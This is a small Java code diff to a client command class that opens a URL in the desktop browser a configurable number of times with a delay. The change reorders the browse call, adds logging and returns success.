@@ -44,14 +44,16 @@ public class ClientOpenURLCommand extends ClientCommand {
 
         try {
             for(int i = 0; i < count; i++) {
+                logger.log("Opening '"+URL+"' "+count+" time(s)");
+                Desktop.getDesktop().browse(new URI(URL));
                 try {
                     Thread.sleep(delay);
                 } catch (InterruptedException e) {
                     this.error = "Unexpected InterruptedException occurred";
                     return false;
                 }
-                Desktop.getDesktop().browse(new URI(URL));
             }
+            return true;
         } catch (Exception e) {
             //TODO: send error feedback to server
             this.error = "Java.awt.Desktop is not supported on this client";
